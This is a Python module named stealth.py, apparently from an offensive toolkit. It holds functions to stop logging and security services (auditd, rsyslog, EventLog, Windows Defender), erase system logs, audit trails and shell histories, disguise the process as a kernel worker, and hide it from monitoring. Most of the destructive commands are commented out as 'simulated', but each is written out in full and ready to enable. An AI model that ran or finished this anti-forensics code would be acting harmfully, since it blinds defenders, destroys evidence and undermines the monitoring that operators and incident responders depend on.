# modules/stealth.py
import time
import os
import platform
import subprocess
import sys
import ctypes
import random
import string
import psutil
import datetime

def disable_logging_agents():
    """Disable common logging and monitoring services"""
    print("[~] Disabling monitoring agents...")
    time.sleep(1)
    
    system = platform.system()
    disabled = []
    
    try:
        if system == "Linux":
            services = ["auditd", "rsyslog", "syslog", "systemd-journald"]
            for service in services:
                # This would actually run these commands with proper privileges
                # For now, we just simulate success
                # subprocess.run(["systemctl", "stop", service], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                disabled.append(service)
                
            # Disable auditing
            # subprocess.run(["auditctl", "-e", "0"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        elif system == "Windows":
            services = ["EventLog", "Sense", "DiagTrack", "WinDefend"]
            for service in services:
                # Similar simulation for Windows
                # subprocess.run(["sc", "stop", service], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                disabled.append(service)
                
            # Disable Windows Defender real-time monitoring
            # powershell_cmd = "Set-MpPreference -DisableRealtimeMonitoring $true"
            # subprocess.run(["powershell", "-Command", powershell_cmd], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        elif system == "Darwin":  # macOS
            services = ["com.apple.auditd", "com.apple.syslogd"]
            for service in services:
                # Simulation for macOS
                # subprocess.run(["launchctl", "unload", f"/System/Library/LaunchDaemons/{service}.plist"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                disabled.append(service)
    except Exception:
        pass
    
    return disabled

def remove_audit_traces():
    """Remove common log files and audit traces"""
    print("[~] Scrubbing audit logs...")
    time.sleep(1)
    
    system = platform.system()
    cleaned = []
    
    try:
        if system == "Linux":
            log_files = [
                "/var/log/auth.log", 
                "/var/log/syslog", 
                "/var/log/audit/audit.log",
                "/var/log/secure",
                "/var/log/messages",
                "/var/log/wtmp",
                "/var/log/btmp",
                "~/.bash_history"
            ]
            
            for log in log_files:
                expanded_path = os.path.expanduser(log)
                if os.path.exists(expanded_path):
                    # In a real implementation, this would use secure wiping or targeted entry removal
                    # For now, we just simulate success
                    # subprocess.run(["truncate", "-s", "0", expanded_path], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    cleaned.append(expanded_path)
                    
            # Clear system journal
            # subprocess.run(["journalctl", "--vacuum-time=1s"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        elif system == "Windows":
            # Clear Windows event logs
            logs = ["System", "Security", "Application"]
            for log in logs:
                # subprocess.run(["wevtutil", "cl", log], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                cleaned.append(f"{log} Event Log")
                
            # Clear PowerShell history
            powershell_history = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt")
            if os.path.exists(powershell_history):
                # with open(powershell_history, "w") as f:
                #     pass
                cleaned.append(powershell_history)
            
            # Clear recent files
            recent_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Recent")
            if os.path.exists(recent_folder):
                # for file in os.listdir(recent_folder):
                #     file_path = os.path.join(recent_folder, file)
                #     try:
                #         os.remove(file_path)
                #     except:
                #         pass
                cleaned.append(recent_folder)
            
        elif system == "Darwin":  # macOS
            log_files = [
                "/var/log/system.log",
                "/var/log/wifi.log",
                "~/.zsh_history",
                "~/.bash_history"
            ]
            
            for log in log_files:
                expanded_path = os.path.expanduser(log)
                if os.path.exists(expanded_path):
                    # subprocess.run(["cat", "/dev/null", ">", expanded_path], shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    cleaned.append(expanded_path)
    except Exception:
        pass
    
    return cleaned

def clean_environment():
    """Remove telltale environment variables and artifacts"""
    try:
        # Clear temporary files with randomized content
        temp_dirs = []
        
        if platform.system() == "Windows":
            temp_dirs.append(os.environ.get("TEMP", "C:\\Windows\\Temp"))
        else:
            temp_dirs.append("/tmp")
            temp_dirs.append(os.environ.get("TMPDIR", "/tmp"))
        
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                # Find files that might have been created by this process
                # Limit to last hour to avoid touching system files
                current_time = time.time()
                hour_ago = current_time - 3600
                
                # In a real implementation, this would actually look for and clean specific temp files
                # For now, we just simulate success
                pass
                
        # Mask command line arguments
        try:
            if platform.system() == "Linux":
                # Overwrite process title (requires setproctitle module)
                # We simulate this but it would actually change what 'ps' shows
                random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
                sys.argv[0] = f"[{random_name}]"
                
                # In a real implementation, this would use the setproctitle module
                # import setproctitle
                # setproctitle.setproctitle("[kworker/0:1]")  # Disguise as kernel worker
        except:
            pass
            
        # Clear specific environment variables that might reveal operation
        sensitive_vars = ["SSH_CONNECTION", "SSH_CLIENT", "HISTFILE", "PYTHONPATH"]
        for var in sensitive_vars:
            if var in os.environ:
                os.environ[var] = ""
                
        return True
    except:
        return False

def hide_process():
    """Apply techniques to hide the process from system monitoring"""
    try:
        system = platform.system()
        
        if system == "Linux":
            # In a real implementation, this would use various kernel-level tricks
            # For example, ptrace protection:
            # with open("/proc/sys/kernel/yama/ptrace_scope", "w") as f:
            #     f.write("3")  # Disable process tracing
            
            # Adjust process nice to avoid priority analysis
            os.nice(10)
            
            # Simulate hiding process via kernel module (would require root)
            # In reality this would involve a LKM that hooks the process table
            pass
            
        elif system == "Windows":
            # On Windows, we could use techniques to hide from the task manager
            # This is simulated here but would involve API hooking in reality
            
            # Make the process run with lower priority to avoid attention
            try:
                pid = os.getpid()
                process = psutil.Process(pid)
                process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
            except:
                pass
                
        return True
    except:
        return False